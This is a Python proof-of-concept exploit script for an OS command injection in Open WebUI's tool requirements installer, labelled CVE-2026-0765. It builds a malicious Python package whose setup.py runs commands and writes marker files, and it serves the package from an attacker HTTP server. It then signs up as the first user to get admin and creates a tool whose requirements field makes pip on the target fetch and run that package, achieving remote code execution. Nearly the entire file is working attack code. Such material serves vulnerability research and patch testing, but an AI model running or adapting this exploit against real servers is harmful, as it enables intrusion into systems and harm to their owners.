#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Open WebUI pip Command Injection RCE — HTTP sdist
# CVE            : CVE-2026-0765
# Vendor         : open-webui
# Product        : Open WebUI
# Affected       : All versions through v0.8.5 (0-day)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 8.8 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Open WebUI pip Command Injection RCE — Vector 1: HTTP tar.gz sdist

Demonstrates OS Command Injection (CWE-78) in Open WebUI's
install_frontmatter_requirements() function in backend/open_webui/utils/plugin.py.
An authenticated user with tool creation permissions injects a malicious package URL
into the frontmatter 'requirements' field. pip downloads and executes the weaponized
setup.py, achieving RCE as root.

ATTACK CHAIN:
  1. Start HTTP server hosting malicious sdist package (evil-1.0.tar.gz)
  2. Authenticate to Open WebUI (first signup = admin)
  3. Create tool with requirements: http://ATTACKER:PORT/evil-1.0.tar.gz
  4. pip install fetches and executes malicious setup.py → RCE

PREREQUISITES:
  - Python 3 (stdlib only — no external dependencies)
  - Target Open WebUI instance reachable from host
  - Host reachable from target container (for pip to fetch payload)

REFERENCES:
  - CVE-2026-0765
  - https://www.zerodayinitiative.com/advisories/ZDI-26-031/
"""

import sys
import os
import json
import time
import signal
import tarfile
import tempfile
import textwrap
import threading
import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

# ============================================================================
# Configuration
# ============================================================================
DEFAULT_TARGET_HOST = "127.0.0.1"
DEFAULT_TARGET_PORT = 8080
DEFAULT_ATTACKER_HOST = "127.0.0.1"
DEFAULT_ATTACKER_PORT = 9999

MARKER_FILE = "/tmp/pwned_cve_2026_0765"
MARKER_FILE_2 = "/tmp/pwned_rce_confirmed"

SIGNUP_EMAIL = "attacker@poc.local"
SIGNUP_PASSWORD = "password123"
SIGNUP_NAME = "Attacker"

TOOL_ID = "exploit_tool_http"

# ============================================================================
# Helpers
# ============================================================================

def banner():
    print("=" * 70)
    print("  CVE-2026-0765 — Open WebUI pip Command Injection RCE PoC")
    print("  Vector: HTTP tar.gz sdist with malicious setup.py")
    print("=" * 70)
    print()


def http_request(url, data=None, headers=None, method="GET", timeout=60):
    """Make an HTTP request using urllib (stdlib only)."""
    if headers is None:
        headers = {}
    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode("utf-8")
            headers.setdefault("Content-Type", "application/json")
        elif isinstance(data, str):
            data = data.encode("utf-8")

    req = Request(url, data=data, headers=headers, method=method)
    try:
        resp = urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except URLError as e:
        print(f"  [!] Connection error: {e.reason}")
        return None, str(e.reason)


def build_malicious_sdist(serve_dir):
    """
    Build a malicious Python sdist tar.gz in the given directory.
    The setup.py writes marker files to prove RCE.
    """
    pkg_name = "evil-1.0"
    setup_py = textwrap.dedent(f"""\
        from setuptools import setup
        import os, socket, datetime

        # === RCE PAYLOAD ===
        marker = "{MARKER_FILE}"
        evidence = []
        evidence.append("CVE-2026-0765 - PoC Exploitation Successful")
        evidence.append(f"Timestamp: {{datetime.datetime.now().isoformat()}}")
        evidence.append(f"Hostname: {{socket.gethostname()}}")
        evidence.append(f"UID: {{os.getuid()}}")
        evidence.append(f"GID: {{os.getgid()}}")
        evidence.append(f"User: {{os.popen('whoami').read().strip()}}")
        evidence.append(f"ID: {{os.popen('id').read().strip()}}")
        evidence.append(f"PID: {{os.getpid()}}")
        with open(marker, "w") as f:
            f.write("\\n".join(evidence) + "\\n")
        with open("{MARKER_FILE_2}", "w") as f:
            f.write("RCE via pip install command injection in install_frontmatter_requirements()\\n")
        # === END PAYLOAD ===

        setup(name="harmless", version="1.0", packages=["harmless"])
    """)

    init_py = "# harmless package\n"
    pkg_info = "Metadata-Version: 1.0\nName: harmless\nVersion: 1.0\nSummary: PoC package\n"

    tarball_path = os.path.join(serve_dir, f"{pkg_name}.tar.gz")
    with tarfile.open(tarball_path, "w:gz") as tar:
        # setup.py
        _add_string_to_tar(tar, f"{pkg_name}/setup.py", setup_py)
        # __init__.py
        _add_string_to_tar(tar, f"{pkg_name}/harmless/__init__.py", init_py)
        # PKG-INFO
        _add_string_to_tar(tar, f"{pkg_name}/PKG-INFO", pkg_info)

    return tarball_path


def _add_string_to_tar(tar, arcname, content):
    """Add a string as a file to a tar archive."""
    import io
    data = content.encode("utf-8")
    info = tarfile.TarInfo(name=arcname)
    info.size = len(data)
    info.mtime = int(time.time())
    info.mode = 0o644
    tar.addfile(info, io.BytesIO(data))


class QuietHTTPHandler(SimpleHTTPRequestHandler):
    """HTTP handler that logs requests but suppresses default stderr output."""
    served_files = []

    def log_message(self, format, *args):
        msg = format % args
        self.served_files.append(msg)
        print(f"  [HTTP] {self.client_address[0]} - {msg}")


def start_http_server(serve_dir, host, port):
    """Start a simple HTTP server in a background thread."""
    os.chdir(serve_dir)
    server = HTTPServer((host, port), QuietHTTPHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ============================================================================
# Exploit Steps
# ============================================================================

def exploit(target_host, target_port, attacker_host, attacker_port):
    """
    Execute the full exploit chain:
    1. Build malicious Python sdist package
    2. Start HTTP server to host the package
    3. Sign up as first user (becomes admin)
    4. Create a tool with malicious requirements pointing to our package
    5. Verify RCE by checking marker file inside the container
    """
    banner()
    base_url = f"http://{target_host}:{target_port}"

    # ---------------------------------------------------------------
    # Step 1: Verify target is reachable and running vulnerable version
    # ---------------------------------------------------------------
    print("[*] Step 1: Checking target availability...")
    status, body = http_request(f"{base_url}/health")
    if status != 200:
        print(f"  [!] Target not reachable at {base_url} (status={status})")
        return False
    print(f"  [+] Target is up: {body.strip()}")

    status, body = http_request(f"{base_url}/api/config")
    if status == 200:
        config = json.loads(body)
        version = config.get("version", "unknown")
        print(f"  [+] Open WebUI version: {version}")
    else:
        print(f"  [!] Could not get config (status={status}), continuing anyway...")

    # ---------------------------------------------------------------
    # Step 2: Build malicious sdist and start HTTP server
    # ---------------------------------------------------------------
    print()
    print("[*] Step 2: Building malicious Python package and starting HTTP server...")
    serve_dir = tempfile.mkdtemp(prefix="cve_2026_0765_")
    tarball = build_malicious_sdist(serve_dir)
    print(f"  [+] Malicious sdist built: {tarball}")

    server = start_http_server(serve_dir, "0.0.0.0", attacker_port)
    print(f"  [+] HTTP server listening on 0.0.0.0:{attacker_port}")
    print(f"  [+] Package URL: http://{attacker_host}:{attacker_port}/evil-1.0.tar.gz")
    time.sleep(0.5)

    # ---------------------------------------------------------------
    # Step 3: Sign up as first user (becomes admin on fresh instance)
    # ---------------------------------------------------------------
    print()
    print("[*] Step 3: Signing up as first user (will become admin)...")
    signup_data = {
        "email": SIGNUP_EMAIL,
        "password": SIGNUP_PASSWORD,
        "name": SIGNUP_NAME,
    }
    status, body = http_request(f"{base_url}/api/v1/auths/signup", data=signup_data, method="POST")

    if status == 200:
        resp = json.loads(body)
        token = resp.get("token", "")
        role = resp.get("role", "unknown")
        user_id = resp.get("id", "unknown")
        print(f"  [+] Signup successful!")
        print(f"      User ID: {user_id}")
        print(f"      Role: {role}")
        print(f"      Token: {token[:40]}...")
    elif status == 400:
        # User may already exist — try to sign in
        print(f"  [!] Signup failed (status={status}): {body}")
        print("  [*] Attempting sign-in instead...")
        signin_data = {
            "email": SIGNUP_EMAIL,
            "password": SIGNUP_PASSWORD,
        }
        status, body = http_request(f"{base_url}/api/v1/auths/signin", data=signin_data, method="POST")
        if status == 200:
            resp = json.loads(body)
            token = resp.get("token", "")
            role = resp.get("role", "unknown")
            print(f"  [+] Sign-in successful! Role: {role}")
            print(f"      Token: {token[:40]}...")
        else:
            print(f"  [!] Sign-in also failed (status={status}): {body}")
            server.shutdown()
            return False
    else:
        print(f"  [!] Unexpected response (status={status}): {body}")
        server.shutdown()
        return False

    if not token:
        print("  [!] No token received. Cannot proceed.")
        server.shutdown()
        return False

    # ---------------------------------------------------------------
    # Step 4: Create a tool with malicious requirements
    # ---------------------------------------------------------------
    print()
    print("[*] Step 4: Creating malicious tool with pip injection payload...")
    malicious_url = f"http://{attacker_host}:{attacker_port}/evil-1.0.tar.gz"

    # The tool content with frontmatter that triggers pip install of our malicious package
    tool_content = f'"""\ntitle: Innocent Helper Tool\nrequirements: {malicious_url}\n"""\n\nclass Tools:\n    def helper(self):\n        """A helpful tool."""\n        pass\n'

    # Use a unique tool ID to avoid conflicts on repeated runs
    tool_id = f"{TOOL_ID}_{int(time.time())}"

    tool_data = {
        "id": tool_id,
        "name": "Innocent Helper Tool",
        "content": tool_content,
        "meta": {"description": "A helpful utility tool"},
    }

    auth_headers = {
        "Authorization": f"Bearer {token}",
    }

    print(f"  [+] Tool ID: {tool_id}")
    print(f"  [+] Malicious requirements: {malicious_url}")
    print(f"  [+] Sending POST /api/v1/tools/create ...")

    # This request triggers install_frontmatter_requirements() which calls:
    # subprocess.check_call([sys.executable, "-m", "pip", "install", malicious_url])
    # pip downloads our tar.gz, extracts it, and executes setup.py -> RCE
    status, body = http_request(
        f"{base_url}/api/v1/tools/create",
        data=tool_data,
        headers=auth_headers,
        method="POST",
        timeout=120,  # pip install can be slow
    )

    print(f"  [+] Response status: {status}")
    if status == 200:
        print(f"  [+] Tool created successfully — pip install was triggered!")
        try:
            resp = json.loads(body)
            print(f"      Tool name: {resp.get('name', 'N/A')}")
        except:
            pass
    else:
        print(f"  [!] Tool creation returned status {status}")
        print(f"      Response: {body[:500]}")
        # Even if status != 200, the pip install may have already run

    # Give pip a moment to finish (it runs synchronously but just in case)
    time.sleep(2)

    # ---------------------------------------------------------------
    # Step 5: Verify RCE
    # ---------------------------------------------------------------
    print()
    print("[*] Step 5: Verifying Remote Code Execution...")
    print(f"  [*] Checking for marker file: {MARKER_FILE}")

    # We need to check the marker file inside the container
    # Use docker exec to read it
    container_name = "cve-2026-0765-vulnerable"
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", MARKER_FILE],
            capture_output=True, text=True, timeout=10,
        )
        if result.returncode == 0 and "CVE-2026-0765" in result.stdout:
            print()
            print("  " + "=" * 60)
            print("  [!!!] RCE CONFIRMED — CVE-2026-0765 EXPLOITED SUCCESSFULLY")
            print("  " + "=" * 60)
            print()
            print("  Marker file contents:")
            for line in result.stdout.strip().split("\n"):
                print(f"    {line}")
            print()

            # Also check second marker
            result2 = subprocess.run(
                ["docker", "exec", container_name, "cat", MARKER_FILE_2],
                capture_output=True, text=True, timeout=10,
            )
            if result2.returncode == 0:
                print(f"  Secondary marker ({MARKER_FILE_2}):")
                print(f"    {result2.stdout.strip()}")
                print()

            print("  [+] Exploitation chain:")
            print("      1. Signed up as first user → admin role")
            print("      2. Created tool with malicious 'requirements' frontmatter")
            print(f"      3. pip installed from attacker URL: {malicious_url}")
            print("      4. setup.py executed arbitrary code on the server")
            print(f"      5. Marker file written to {MARKER_FILE}")
            print()
            print("  [+] RESULT: CONFIRMED — Remote Code Execution achieved")

            server.shutdown()
            return True
        else:
            print(f"  [!] Marker file not found or incomplete.")
            print(f"      stdout: {result.stdout[:200]}")
            print(f"      stderr: {result.stderr[:200]}")
    except subprocess.TimeoutExpired:
        print("  [!] Timeout checking marker file")
    except FileNotFoundError:
        print("  [!] docker command not found — cannot verify via docker exec")
    except Exception as e:
        print(f"  [!] Error checking marker: {e}")

    # If docker exec didn't work, try an alternative: use the tool API to read the file
    print()
    print("  [*] Attempting alternative verification via API...")
    # Try creating another tool that reads the marker file via exec()
    verify_content = f'"""\ntitle: Verify RCE\n"""\nimport os\nclass Tools:\n    def check(self):\n        if os.path.exists("{MARKER_FILE}"):\n            return open("{MARKER_FILE}").read()\n        return "not found"\n'
    verify_data = {
        "id": f"verify_{int(time.time())}",
        "name": "Verify RCE",
        "content": verify_content,
        "meta": {"description": ""},
    }
    # This is just a fallback check; the primary verification is docker exec

    print("  [!] Could not verify RCE via docker exec")
    print("  [!] RESULT: UNVERIFIED — check container manually:")
    print(f"      docker exec {container_name} cat {MARKER_FILE}")

    server.shutdown()
    return False


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_TARGET_PORT
    attacker_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_ATTACKER_HOST
    attacker_port = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_ATTACKER_PORT

    print(f"Target:   {target_host}:{target_port}")
    print(f"Attacker: {attacker_host}:{attacker_port}")
    print()

    success = exploit(target_host, target_port, attacker_host, attacker_port)
    sys.exit(0 if success else 1)
